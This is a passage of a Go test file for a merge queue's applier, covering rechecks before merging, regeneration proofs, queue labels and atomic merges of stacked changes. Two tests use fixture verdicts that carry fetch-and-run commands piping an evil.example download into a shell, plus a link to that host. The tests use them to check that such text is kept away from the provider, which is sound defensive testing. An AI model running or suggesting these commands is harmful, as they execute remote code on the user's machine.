		"the kick-back leaves the change needing regeneration, not merely kicked back")
}

// The build facts are the base's declarations, and a change merged beneath this one in
// the same run can make one of its files a generator's input. So the proof covers
// everything between the base and what the candidate is rebuilt onto: failing there
// alone waits for a run whose base holds it, and failing in the change's own files
// kicks it back. Nothing is regenerated either way.
func TestRegenerationOntoAChangeMergedThisRunProvesWhatLiesBeneath(t *testing.T) {
	one, two := change("1", "a"), change("2", "a")
	v1 := validated(one, base, "")
	v2 := validated(two, v1.CandidateCommit, "1")
	cand1 := v1.CandidateCommit
	for name, tc := range map[string]struct {
		code       []string
		kick, wait string
	}{
		"code only what it builds on changes": {code: []string{"magusfile.buzz"},
			wait: "regenerating `gen/x.go` on " + cand1[:12] + " would run `magusfile.buzz`, which it does not change but what it builds on does"},
		"its own code": {code: []string{"a/y.go", "magusfile.buzz"}, kick: "and magusfile.buzz is a magusfile (`a/y.go`, `magusfile.buzz`), so only its author can regenerate them"},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			d.caps()
			d.cleanMerge(v1, types.MergeResult{})
			d.bases(oid("after", "1"))
			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, oid("after", "1")).Return(true, nil).Once()
			d.rechecks(two, approvedAs(two))
			d.rebuilds(two, cand1, head("rebuilt"), "a/y.go", "gen/x.go")
			d.facts.EXPECT().Classify(mock.Anything, []string{"a/y.go", "gen/x.go"}).Return(map[string]types.Writes{"gen/x.go": {Output: true}}, nil)
			d.vcs.EXPECT().RangeFiles(mock.Anything, clone.Root, base, two.Head, []string(nil)).Return([]string{"a/y.go"}, nil)
			d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, base, cand1).Return([]string{"gen/x.go", "magusfile.buzz"}, nil)
			d.facts.EXPECT().Generation(mock.Anything, []string{"gen/x.go"}, []string{"a/y.go", "magusfile.buzz"}).
				Return(types.Generation{Units: []string{"gen"}, Code: tc.code, Unbounded: "magusfile.buzz is a magusfile"}, nil)
			if tc.kick != "" {
				d.kicks(two, types.CodeKickRegeneration, tc.kick)
			} else {
				d.waits(two, two.Head, tc.wait)
			}
			a := applierFor(t, d, planOf([]types.Change{one, two}), v1, v2)
			a.Regenerate = func(context.Context, types.Regeneration) error {
				t.Error("regenerated without a proof over what it builds on")
				return nil
			}
			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one, two})))
		})
	}
}

// Where the build tool proves the change touches none of the generator's code, applying
// runs the base's own regeneration, with the proven units, and merges only a rebuild that
// is the validated candidate.
func TestTheBasesOwnRegenerationRebuildsTheCandidate(t *testing.T) {
	for name, tc := range map[string]struct {
		regenerated string
		kick        string
	}{
		"reproduced":   {},
		"another tree": {regenerated: head("other"), kick: "the base's regeneration of `gen/x.go` differs from what validation produced in `gen/x.go`"},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			c := change("1", "a")
			v := validated(c, base, "")
			d.caps()
			d.rechecks(c, approvedAs(c))
			d.rebuilds(c, base, head("rebuilt"), "gen/x.go")
			d.facts.EXPECT().Classify(mock.Anything, []string{"gen/x.go"}).Return(map[string]types.Writes{"gen/x.go": {Output: true}}, nil)
			d.vcs.EXPECT().RangeFiles(mock.Anything, clone.Root, base, c.Head, []string(nil)).Return([]string{"a/x.go"}, nil)
			d.facts.EXPECT().Generation(mock.Anything, []string{"gen/x.go"}, []string{"a/x.go"}).Return(types.Generation{Units: []string{"gen"}}, nil)
			regenerated := v.CandidateCommit
			if tc.regenerated != "" {
				regenerated = tc.regenerated
			}
			d.vcs.EXPECT().DirtyFiles(mock.Anything, mock.Anything, []string(nil)).Return([]string{"gen/x.go"}, nil)
			d.facts.EXPECT().Classify(mock.Anything, []string{"gen/x.go"}).Return(map[string]types.Writes{"gen/x.go": {Output: true}}, nil)
			d.vcs.EXPECT().Commit(mock.Anything, mock.Anything, magustypes.CheckoutCommit{CommitMeta: queueMeta("regenerate generated files", when), Paths: []string{"gen/x.go"}}).Return(regenerated, nil)
			var units []string
			if tc.kick != "" {
				d.bases(base)
				d.vcs.EXPECT().DiffTrees(mock.Anything, clone.Root, regenerated, v.CandidateCommit).Return([]string{"gen/x.go"}, nil)
				d.kicks(c, types.CodeKickRefused, tc.kick)
			} else {
				after := oid("after", "1")
				d.bases(base, base, after)
				d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
				d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
				d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
				d.green(c, c.Head)
				d.mergesAt(c, c.Head, squashOf(v.Change), after, "validated", base)
			}
			a := applierFor(t, d, planOf([]types.Change{c}), v)
			a.Regenerate = func(_ context.Context, r types.Regeneration) error {
				units = r.Units
				assert.Equal(t, []string{"gen/x.go"}, r.Paths)
				return nil
			}
			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
			assert.Equal(t, []string{"gen"}, units)
		})
	}
}

// Applying re-reads the change before it merges: a head pushed, an intent withdrawn, an
// approval dismissed, a method switched or a base changed since validation all leave the
// change queued, and nothing is merged.
func TestAChangeThatMovedSinceValidationIsNotMerged(t *testing.T) {
	c := change("1", "a")
	moved := head("pushed later")
	for name, tc := range map[string]struct {
		a      types.Approval
		commit string
		reason string
	}{
		"a new head":         {a: types.Approval{Approved: true, Head: moved, Base: "main", Method: types.MethodSquash, Queued: true}, commit: moved, reason: "head moved to " + moved[:12] + " after validation"},
		"withdrawn":          {a: types.Approval{Approved: true, Head: c.Head, Base: "main", Method: types.MethodSquash}, commit: c.Head, reason: "its merge intent was withdrawn after validation"},
		"approval dismissed": {a: types.Approval{Head: c.Head, Base: "main", Method: types.MethodSquash, Queued: true, Reason: "dismissed"}, commit: c.Head, reason: "approval at " + c.Head[:12] + " was withdrawn: dismissed"},
		"another method":     {a: types.Approval{Approved: true, Head: c.Head, Base: "main", Method: types.MethodMerge, Queued: true}, commit: c.Head, reason: "validated as squash, now merge"},
		"another base":       {a: types.Approval{Approved: true, Head: c.Head, Base: "release", Method: types.MethodSquash, Queued: true}, commit: c.Head, reason: "targets release, not main; skipped"},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			v := validated(c, base, "")
			d.caps(types.MethodSquash, types.MethodMerge)
			d.bases(base)
			d.rechecks(c, tc.a)
			d.waits(c, tc.commit, tc.reason)
			a := applierFor(t, d, planOf([]types.Change{c}), v)
			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
		})
	}
}

// Merge intent, base and head are read once more right before the merge.
func TestAChangeWithdrawnRightBeforeItsMergeIsNotMerged(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	v := validated(c, base, "")
	d.caps()
	d.bases(base)
	d.rechecks(c, approvedAs(c))
	d.rebuilds(c, base, v.CandidateCommit, "a/x.go")
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
	withdrawn := approvedAs(c)
	withdrawn.Queued = false
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(withdrawn, nil).Once()
	d.waits(c, c.Head, "its merge intent was withdrawn before its merge")
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
}

func TestAProviderRefusalWaitsAndHoldsWhatIsValidatedOnIt(t *testing.T) {
	d := newDoubles(t)
	one, two := change("1", "a"), change("2", "a")
	v1 := validated(one, base, "")
	v2 := validated(two, v1.CandidateCommit, "1")
	d.caps()
	d.bases(base, base)
	d.rechecks(one, approvedAs(one))
	d.rebuilds(one, base, v1.CandidateCommit, "a/x.go")
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v1.CandidateCommit).Return("validated", nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: one.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, one.Head).Return(approvedAs(one), nil).Once()
	success := d.green(one, one.Head)
	d.squashes(one)
	refused := d.provider.EXPECT().MergeChange(mock.Anything, mock.Anything, types.MergeOptions{Commit: one.Head, Message: squashOf(v1.Change)}).
		Return(types.MergeResult{}, errors.New("required status missing")).NotBefore(success)
	// The success it posted goes back to pending.
	d.status(one, one.Head, types.StatePending, "waiting: the provider refused the merge: required status missing").NotBefore(refused)
	d.waits(two, two.Head, "validated on top of #1, which did not merge")
	a := applierFor(t, d, planOf([]types.Change{one, two}), v1, v2)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one, two})))
}

// A verdict names its change, but only the plan says which head was admitted and what
// lies beneath it; one that disagrees merges nothing.
func TestAVerdictThatDisagreesWithThePlanMergesNothing(t *testing.T) {
	one := change("1", "a")
	two := stacked("2", one, "a")
	for name, tc := range map[string]struct {
		v      types.Verdict
		reason string
	}{
		"another base":      {v: func() types.Verdict { v := validated(one, base, ""); v.BaseCommit = head("old"); return v }(), reason: "validated on " + head("old")[:12] + ", not this plan's base"},
		"another head":      {v: func() types.Verdict { v := validated(one, base, ""); v.Change.Head = head("x"); return v }(), reason: "validated at " + head("x")[:12] + ", not the planned head"},
		"after nothing":     {v: validated(one, base, "7"), reason: "validated on top of #7, which is not beneath it in its partition"},
		"not onto the base": {v: validated(one, head("elsewhere"), ""), reason: "validated at the bottom of its partition, but onto " + head("elsewhere")[:12] + ", not the plan's base"},
	} {
		t.Run(name, func(t *testing.T) {
			d := newDoubles(t)
			d.caps()
			d.waits(one, one.Head, tc.reason)
			a := applierFor(t, d, planOf([]types.Change{one}), tc.v)
			require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
		})
	}
	t.Run("without the change beneath", func(t *testing.T) {
		d := newDoubles(t)
		d.caps()
		d.waits(one, one.Head, "conflicts")
		d.waits(two, two.Head, "validated without #1, which it is stacked on")
		held := types.Verdict{BaseCommit: base, Change: one, Decision: types.DecisionWait, Code: types.CodeWaitConflictAhead, Reason: "conflicts"}
		a := applierFor(t, d, planOf([]types.Change{one, two}), held, validated(two, base, ""))
		require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one, two})))
	})
}

func TestAnUnreadableVerdictHoldsItsChangeAlone(t *testing.T) {
	d := newDoubles(t)
	one := change("1", "a")
	d.caps()
	d.noCheckouts()
	d.noneGreen()
	d.marks(nil)
	d.src.EXPECT().Poll(mock.Anything).Return(types.VerdictBatch{Rejected: []types.RejectedVerdict{{Change: "1", Reason: "not a zip"}, {Change: "8", Reason: "x"}}, Done: true}, nil)
	d.waits(one, one.Head, "its verdict could not be read: not a zip")
	a, err := NewApplier(d.vcs, clone, d.provider, d.src, d.facts, t.TempDir())
	require.NoError(t, err)
	a.Base = "main"
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
}

// Planning's verdicts and validation's red ones reach the provider, each naming the run
// they came from, and validation's with apply's own hook lines to run it again; a kick
// for a head that moved since it was decided waits instead, since the new head gets its
// own decision. The words are the queue's: what a verdict said travels only as the
// claim, and the hook lines a verdict names never reach the provider.
func TestSettledVerdictsReachTheProvider(t *testing.T) {
	kicked, held, gone, red, moved := change("1", "a"), change("2", "b"), change("3", "c"), change("4", "d"), change("5", "e")
	d := newDoubles(t)
	d.caps()
	d.kicksWith(kicked, types.Kick{Code: types.CodeKickConflict, Report: conflictReport("main", kicked.Head), Paths: []string{"a.go"},
		Source: "acme/widgets/runs/7"})
	d.waits(held, held.Head, "not approved")
	d.kicksWith(red, types.Kick{Code: types.CodeKickRed,
		Report: "The merge queue built this change at `" + red.Head[:12] + "` onto `main` at `" + base[:12] + "`, and the gate failed on it and passed without it.\n",
		Claim:  "the gate exited 1", Source: "acme/widgets/runs/7", Reproduce: &types.Reproduction{Gate: "make test", Regenerate: "make gen"}})
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, moved.Head).Return(types.Approval{Head: head("newer"), Base: "main", Method: types.MethodSquash}, nil)
	d.waits(moved, head("newer"), "head moved to "+head("newer")[:12]+" since it was decided")
	plan := planOf([]types.Change{red}, []types.Change{moved})
	plan.Verdicts = []types.Verdict{
		{Change: kicked, Decision: types.DecisionKick, Code: types.CodeKickConflict, Report: "@team see [this](https://evil.example)", Paths: []string{"a.go"}},
		{Change: held, Decision: types.DecisionWait, Code: types.CodeWaitNotApproved, Reason: "not approved"},
		{Change: gone, Decision: types.DecisionMerged, Reason: "its head is already on main"},
	}
	redV := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRed, Onto: base,
		Reason: "the gate exited 1", Report: "@team run `curl evil | sh`", Gate: `bash -c "curl https://evil.example | sh"`}
	movedV := types.Verdict{BaseCommit: base, Change: moved, Decision: types.DecisionKick, Code: types.CodeKickRed, Report: "the gate failed"}
	a := applierFor(t, d, plan, redV, movedV)
	a.Source = "acme/widgets/runs/7"
	a.Reproduce = types.Reproduction{Gate: "make test", Regenerate: "make gen"}
	require.NoError(t, a.Run(t.Context(), plan))
}

// Without hook lines of its own, apply shows no reproduction, whatever the verdict
// names.
func TestAKickBackReproducesOnlyApplysOwnHookLines(t *testing.T) {
	red := change("4", "d")
	d := newDoubles(t)
	d.caps()
	d.kicksWith(red, types.Kick{Code: types.CodeKickRefused, Report: "The merge queue cannot merge this change at `" + red.Head[:12] + "`.\n",
		Claim: "building its candidate failed"})
	v := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRefused,
		Reason: "building its candidate failed", Gate: `sh -c "curl https://evil.example | sh"`}
	a := applierFor(t, d, planOf([]types.Change{red}), v)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{red})))
}

func TestWhatNoVerdictReachedWaitsForTheNextRun(t *testing.T) {
	d := newDoubles(t)
	one := change("1", "a")
	d.caps()
	d.waits(one, one.Head, "not validated in this run")
	a := applierFor(t, d, planOf([]types.Change{one}))
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
}

// A dry run reports and calls nothing on the provider: no expectation is set on it, and
// it shows no mark.
func TestApplyDryRunCallsNothingOnTheProvider(t *testing.T) {
	d := newDoubles(t)
	one := change("1", "a")
	marks := d.marks(nil)
	var out bytes.Buffer
	a := applierFor(t, d, planOf([]types.Change{one}), validated(one, base, ""))
	a.DryRun, a.Events = true, NewEvents(&out)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{one})))
	assert.Contains(t, out.String(), "dry run: would merge candidate "+candidateOf(base, one.Head)[:12])
	assert.Empty(t, marks.entries())
}

// A run starts by marking queued what the plan admitted, the changes planning left
// waiting included, and by clearing the queued mark an unqueued change still shows. A
// change planning found merged loses its mark, and so does a closed one; a kick-back's
// mark on an unqueued change stays for its author to read.
func TestARunMarksWhatThePlanAdmittedAndClearsAQueuedMarkLeftBehind(t *testing.T) {
	d := newDoubles(t)
	one, two, held, gone := change("1", "a"), change("2", "b"), change("3"), change("5")
	d.caps()
	marks := d.marks(nil)
	d.waits(held, held.Head, "r")
	d.waits(one, one.Head, "not validated in this run")
	d.waits(two, two.Head, "not validated in this run")
	plan := planOf([]types.Change{one}, []types.Change{two})
	plan.Verdicts = []types.Verdict{waiting("3"), {Change: gone, Decision: types.DecisionMerged, Reason: "its head is already on main"}}
	plan.Unqueued = []types.UnqueuedChange{
		{ID: "4", Repo: "acme/acme", Head: head("4"), Mark: types.MarkQueued},
		{ID: "6", Repo: "acme/acme", Head: head("6"), Mark: types.MarkKickedBack},
		{ID: "8", Repo: "acme/acme", Head: head("8"), Mark: types.MarkNeedsRegeneration},
		{ID: "7", Repo: "acme/acme", Head: head("7")},
	}
	plan.Closed = []types.ClosedChange{{ID: "9", Repo: "acme/acme"}}
	a := applierFor(t, d, plan)
	require.NoError(t, a.Run(t.Context(), plan))
	assert.Equal(t, []string{"1 queued", "2 queued", "3 queued", "4 none in acme/acme", "9 none in acme/acme", "5 none"}, marks.entries(),
		"a closed change still showing a queue label is cleared, whoever merged or closed it")
}

// A kick-back shows the kicked-back mark once the provider carried it out.
func TestAKickBackMarksTheChangeKickedBack(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	d.caps()
	marks := d.marks(nil)
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
	d.status(c, c.Head, types.StateFailure, "kicked back")
	d.provider.EXPECT().KickBack(mock.Anything, mock.Anything, c.Head, mock.Anything).Run(func(context.Context, types.Change, string, types.Kick) {
		marks.add("kicked")
	}).Return(nil).Once()
	red := types.Verdict{BaseCommit: base, Change: c, Decision: types.DecisionKick, Code: types.CodeKickRed, Report: "the gate failed"}
	a := applierFor(t, d, planOf([]types.Change{c}), red)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
	assert.Equal(t, []string{"1 queued", "kicked", "1 kicked_back"}, marks.entries())
}

// A merge clears the mark, whoever merged it.
func TestAMergeClearsTheMark(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	v := validated(c, base, "")
	d.caps()
	marks := d.marks(nil)
	_, merge := d.cleanMerge(v, types.MergeResult{ByProvider: true})
	merge.Run(func(mock.Arguments) { marks.add("merged") })
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
	assert.Equal(t, []string{"1 queued", "merged", "1 none"}, marks.entries())
}

// A mark is a courtesy: one the provider cannot show is a notice, and the change still
// merges and loses its mark.
func TestAMarkThatFailsIsANoticeAndApplyingGoesOn(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	v := validated(c, base, "")
	d.caps()
	marks := d.marks(map[string]error{"1 queued": errors.New("labels down")})
	d.cleanMerge(v, types.MergeResult{})
	var out bytes.Buffer
	a := applierFor(t, d, planOf([]types.Change{c}), v)
	a.Events = NewEvents(&out)
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
	assert.Contains(t, out.String(), `"kind":"notice","change":"1","reason":"could not mark #1 queued: labels down"`)
	assert.Contains(t, out.String(), `"kind":"merged","change":"1"`)
	assert.Equal(t, []string{"1 queued", "1 none"}, marks.entries())
}

func TestAChangeRetargetedAfterPlanningIsSkippedWithoutRetargeting(t *testing.T) {
	d := newDoubles(t)
	c := change("1", "a")
	d.caps()
	d.bases(base)
	d.rechecks(c, types.Approval{Approved: true, Head: c.Head, Base: "release", Method: types.MethodSquash, Queued: true})
	d.waits(c, c.Head, "targets release, not main; skipped")
	a := applierFor(t, d, planOf([]types.Change{c}), validated(c, base, ""))
	require.NoError(t, a.Run(t.Context(), planOf([]types.Change{c})))
}

// I19 through the provider: an atomic provider merges a run of stacked changes in one
// call through its top, every member beneath pinned to its head, the bottom merged from
// its natural merge base and each member above from its stack base.
// atomicStack is #2 stacked on #1, both validated, on a provider merging stacks
// atomically, answered as far as both members pass their checks.
type atomicStack struct {
	one, two types.Change
	v1, v2   types.Verdict
	plan     types.Plan
}

func (d doubles) atomicStack() atomicStack {
	s := atomicStack{one: change("1", "a")}
	s.two = stacked("2", s.one, "a")
	s.v1 = validated(s.one, base, "")
	s.v2 = validated(s.two, s.v1.CandidateCommit, "1")
	s.plan = planOf([]types.Change{s.one, s.two})
	d.provider.EXPECT().Describe(mock.Anything, applyQuery).
		Return(types.Capabilities{StackMerge: types.StackMergeAtomic, Methods: []types.MergeMethod{types.MethodSquash}}, nil)
	d.bases(base)
	d.rechecks(s.one, approvedAs(s.one))
	d.rechecks(s.two, approvedAs(s.two))
	d.stackChecks(s.two)
	d.lists(types.Changes{Base: "main", Changes: []types.Change{s.one, s.two}})
	d.rebuilds(s.one, base, s.v1.CandidateCommit, "a/x.go")
	d.rebuilds(s.two, s.v1.CandidateCommit, s.v2.CandidateCommit, "a/y.go")
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, s.one.Head, s.v1.CandidateCommit).Return(true, nil)
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, s.v1.CandidateCommit).Return("tree 1", nil)
	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, s.v2.CandidateCommit).Return("tree 2", nil)
	return s
}

// merges answers the rest of s up to the provider's one call, which err answers:
// both members still queued at their heads, each one's own delta giving its validated
// tree, the base still at its tip, and both green right before the call.
func (d doubles) mergesAtomically(s atomicStack, err error) *mock.Call {
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, s.one.Head).Return(approvedAs(s.one), nil).Once()
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, s.two.Head).Return(approvedAs(s.two), nil).Once()
	// The bottom from its natural merge base, even though a change beneath it may have
	// merged as a squash; the member above from its stack base.
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: s.one.Head}).Return(magustypes.TreeMergeResult{Tree: "tree 1"}, nil)
	expected := head("expected")
	d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, magustypes.TreeCommit{CommitMeta: queueMeta("expected", when), Tree: "tree 1", Parents: []string{base}}).Return(expected, nil)
	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Base: s.one.Head, Ours: expected, Theirs: s.two.Head}).Return(magustypes.TreeMergeResult{Tree: "tree 2"}, nil)
	d.bases(base)
	one := d.green(s.one, s.one.Head)
	two := d.green(s.two, s.two.Head)
	d.squashes(s.two)
	return d.provider.EXPECT().MergeChange(mock.Anything, mock.Anything, types.MergeOptions{Commit: s.two.Head, Message: squashOf(s.v2.Change),
		Through: []types.PinnedChange{{ID: "1", Commit: s.one.Head}}}).Return(types.MergeResult{}, err).NotBefore(one, two)
}

// squashedOnto says the base went from base to after through commits, oldest first,
// each carrying the next validated tree and sitting on the one before.
func (d doubles) squashedOnto(after string, commits ...string) {
	var listed []magustypes.Commit
	below := base
	for i, c := range commits {
		listed = append([]magustypes.Commit{{ID: c, Parents: []string{below}}}, listed...)
		d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, c).Return("tree "+fmt.Sprint(i+1), nil)
		d.vcs.EXPECT().FindCommit(mock.Anything, clone.Root, c).Return(magustypes.Commit{ID: c, Parents: []string{below}}, nil)
		below = c
	}
	d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, after, []string(nil)).Return(listed, nil)
	d.bases(after)
}

func TestAnAtomicProviderMergesAStackRunInOneCallWithEveryMemberPinned(t *testing.T) {
	d := newDoubles(t)
	s := d.atomicStack()
	d.mergesAtomically(s, nil)
	after := oid("after")
	d.squashedOnto(after, head("s1"), after)
	a := applierFor(t, d, s.plan, s.v1, s.v2)
	require.NoError(t, a.Run(t.Context(), s.plan))
}

// I19: a provider that merged only part of the run leaves the base holding members nobody
// merged one at a time, so what merged is recorded and applying stops.
func TestAnAtomicRunThatMergesPartwayStopsApplying(t *testing.T) {
	d := newDoubles(t)
	s := d.atomicStack()
	merge := d.mergesAtomically(s, errors.New("stopped after #1"))
	after := oid("after")
	d.squashedOnto(after, after)
	d.status(s.two, s.two.Head, types.StatePending, "waiting: applying stopped before its merge: stack through #2 merged 1 of 2").NotBefore(merge)
	a := applierFor(t, d, s.plan, s.v1, s.v2)
	err := a.Run(t.Context(), s.plan)
	require.EqualError(t, err, "stack through #2 merged 1 of 2 changes: stopped after #1")
}

// A member whose head moved after its checks leaves the run before the call: it waits on
// its new head, what is stacked on it waits for it, and nothing is merged.
func TestAnAtomicMemberThatMovedIsNotMergedAndHoldsWhatIsAboveIt(t *testing.T) {
	d := newDoubles(t)
	s := d.atomicStack()
	moved := head("pushed later")
	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, s.one.Head).
		Return(types.Approval{Approved: true, Head: moved, Base: "main", Method: types.MethodSquash, Queued: true}, nil).Once()
	d.waits(s.one, moved, "head moved to "+moved[:12]+" before its merge")
	d.waits(s.two, s.two.Head, "stacked on #1, which did not merge")
	a := applierFor(t, d, s.plan, s.v1, s.v2)
	require.NoError(t, a.Run(t.Context(), s.plan))
}

func TestStackRunGreenRunPinsAndBases(t *testing.T) {
	one := change("1")
	two := stacked("2", one)
	three := stacked("3", two)
	loose := change("4")
	q := []types.Change{one, two, three, loose}
	assert.Equal(t, []types.Change{one}, stackRun(q, false), "a sequential provider merges one change per call")
	assert.Equal(t, []types.Change{one, two, three}, stackRun(q, true))
	hinted := two
	hinted.Parent = ""
	assert.Equal(t, []types.Change{one}, stackRun([]types.Change{one, hinted}, true), "the provider must declare the stack too")

	v1 := validated(one, base, "")
	v2 := validated(two, v1.CandidateCommit, "1")
	v3 := validated(three, head("elsewhere"), "2")
	assert.Equal(t, 2, greenRun(q[:3], map[string]types.Verdict{"1": v1, "2": v2, "3": v3}), "the third was not built on the second's candidate")
	assert.Equal(t, 0, greenRun(q[:3], map[string]types.Verdict{"2": v2}))

	assert.Equal(t, []types.PinnedChange{{ID: "1", Commit: one.Head}, {ID: "2", Commit: two.Head}}, pins(q[:3]))
	assert.Empty(t, pins(q[:1]))
	bottom := one
	bottom.StackBase = head("squashed")
	assert.Equal(t, []string{"", two.StackBase, three.StackBase}, runBases([]types.Change{bottom, two, three}))
}

// FuzzAtomicRun holds what an atomic provider is asked to merge to I19, atomic run: a
// run is a prefix of its partition's queue, each member stacked on the one before as
// the provider declared; its green part is each member validated on the candidate
// beneath; one call pins every member beneath the top at its head, lowest first; and the
// bottom merges from its natural merge base, whatever it is stacked on, while each
// member above merges from its stack base.
func FuzzAtomicRun(f *testing.F) {
	f.Add([]byte{})
	f.Fuzz(atomicRunHolds)
}

// atomicRunHolds is FuzzAtomicRun's property over one input.
func atomicRunHolds(t *testing.T, data []byte) {
	d := &draw{data: data}
	atomic := d.n(2) == 1 // the provider merges stacks atomically
	n := 1 + d.n(6)       // changes in the partition
	q := make([]types.Change, n)
	for i := range q {
		c := change(fmt.Sprint(i + 1))
		switch {
		case i == 0 && d.n(2) == 1: // the bottom is stacked on a merged change
			c.StackBase = oid("merged head")
		case i > 0 && d.n(3) != 0: // stacked on the change before it
			c.Below, c.StackBase = q[i-1].ID, q[i-1].Head
			if d.n(4) != 0 { // and the provider says so
				c.Parent = q[i-1].ID
			}
		}
		q[i] = c
	}
	got := map[string]types.Verdict{}
	for i, c := range q {
		if d.n(4) == 0 { // no verdict yet
			continue
		}
		v := validated(c, base, "")
		if d.n(5) == 0 {
			v = types.Verdict{Change: c, Decision: types.DecisionKick, Code: types.CodeKickRed}
		}
		if i > 0 && d.n(4) != 0 { // validated on top of the change before it
			v.After = q[i-1].ID
			if d.n(4) != 0 { // onto its candidate
				v.Onto = got[q[i-1].ID].CandidateCommit
			}
		}
		got[c.ID] = v
	}

	run := stackRun(q, atomic)
	require.NotEmpty(t, run)
	require.Equal(t, q[:len(run)], run, "a run is a prefix of the queue")
	if !atomic {
		require.Len(t, run, 1)
	}
	for i := 1; i < len(run); i++ {
		require.Equal(t, run[i-1].ID, run[i].Below)
		require.Equal(t, run[i-1].ID, run[i].Parent)
	}
	if atomic && len(run) < n {
		next := q[len(run)]
		require.False(t, next.Below == run[len(run)-1].ID && next.Parent == run[len(run)-1].ID, "a run takes every declared member")
	}
	g := greenRun(run, got)
	for i := range run[:g] {
		v := got[run[i].ID]
		require.Equal(t, types.DecisionMerge, v.Decision)
		if i > 0 {
			require.Equal(t, run[i-1].ID, v.After)
			require.Equal(t, got[run[i-1].ID].CandidateCommit, v.Onto)
		}
	}
	if g < len(run) {
		v, ok := got[run[g].ID]
		require.False(t, ok && v.Decision == types.DecisionMerge && (g == 0 || v.After == run[g-1].ID && v.Onto == got[run[g-1].ID].CandidateCommit),
			"the green part takes every green member")
	}
	if g < 2 {
		return
	}
	green := run[:g]
	through := pins(green)
	require.Len(t, through, g-1, "every member beneath the top is pinned")
	for i, p := range through {
		require.Equal(t, types.PinnedChange{ID: green[i].ID, Commit: green[i].Head}, p)
	}
	bases := runBases(green)
	require.Empty(t, bases[0], "the bottom merges from its natural merge base")
	for i := 1; i < g; i++ {
		require.Equal(t, green[i].StackBase, bases[i])
	}
}

// FuzzRetarget holds retargeting to I18, retarget: the queue points a change at its
// base only when it targets the branch of the change it is stacked on and that change
// merged this run; anything else is a change retargeted after planning, and is skipped.
func FuzzRetarget(f *testing.F) {
	f.Add(true, "feature", "1", "feature", true)
	f.Add(true, "feature", "1", "release", true)
	f.Add(true, "", "1", "", true)
	f.Fuzz(func(t *testing.T, stacked bool, branch, belowID, target string, merged bool) {
		c := change("2")
		if stacked {
			c.Below = "1"
		}
		below := change(belowID)
		below.Branch = branch
		ok := retargetable(c, below, merged, target)
		want := stacked && belowID == "1" && merged && branch != "" && branch == target
		require.Equal(t, want, ok)
	})
}

// restacking answers c's merge up to the update commit it needs: c is stacked on m,
// merged as a squash, on a provider that keeps stacked branches linear, so the plain
// merge of c brings back what m's squash left out and c's own delta from m does not.
func (d doubles) restacking(c types.Change, m types.MergedChange, v types.Verdict) {
	d.provider.EXPECT().Describe(mock.Anything, applyQuery).
		Return(types.Capabilities{StackMerge: types.StackMergeSequential, LinearStacks: true, Methods: []types.MergeMethod{types.MethodSquash}, Committer: bot}, nil)
	d.bases(base)
	d.rechecks(c, approvedAs(c))
	// Its stack base is m's own commit, and the provider lists m merged onto the base.
	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, m.Head, c.Head).Return(true, nil).Once()
